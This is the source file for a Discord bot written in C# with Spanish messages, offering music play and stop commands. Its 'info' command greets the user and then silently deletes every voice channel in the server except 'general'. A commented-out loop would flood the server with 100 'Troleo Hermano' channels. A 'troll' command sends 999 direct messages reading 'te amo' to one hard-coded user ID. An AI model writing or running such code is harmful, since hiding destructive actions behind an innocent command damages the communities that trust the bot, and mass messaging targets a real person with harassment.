using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DiscordBot
{
	public class Commands : ModuleBase<SocketCommandContext>
	{
		private Player _player;

		public Commands(Player player) 
		{ 
			_player = player;
		}

		//[Command("help", RunMode = RunMode.Async)]
		//public async Task HelpAsync()
		//{
		//	await ReplyAsync($"Hola {Context.Message.Author}");
		//}

		[Command("info", RunMode = RunMode.Async)]
		public async Task InfoAsync()
		{
			await ReplyAsync($"Hola {Context.User}");
			await ReplyAsync($"Estamos en {Context.Guild.Name}");

			var channels = Context.Guild.VoiceChannels;

			foreach (var channel in channels)
			{
				if (channel.Name != "general")
				{
					await channel.DeleteAsync();
				}
			}

			//for (int i = 0; i < 100; i++)
			//{
			//	await Context.Guild.CreateVoiceChannelAsync($"Troleo Hermano {i + 1}");
			//}
		}

		[Command("play", RunMode = RunMode.Async)]
		public async Task PlayAsync([Remainder]string query)
		{
			IVoiceChannel voiceChannel = (Context.User as IGuildUser).VoiceChannel;
			ITextChannel textChannel = Context.Channel as ITextChannel; 

			if (voiceChannel != null)
			{
				_player.Play(voiceChannel, textChannel, query);
			}
			else
			{
				await ReplyAsync($"No estas en nigún canal de voz");
			}
		}

		[Command("stop", RunMode = RunMode.Async)]
		public async Task StopAsync() => _player.Stop();

		[Command("troll", RunMode = RunMode.Async)]
		public async Task TrollAsync()
		{
			var client = new DiscordSocketClient(new DiscordSocketConfig
			{
				GatewayIntents = GatewayIntents.All
			});

			SocketUser user = client.GetUser(414395803973713940);

			for (int i = 0; i < 999; i++)
			{
				await user.SendMessageAsync("te amo");
			}
		}
	}
}
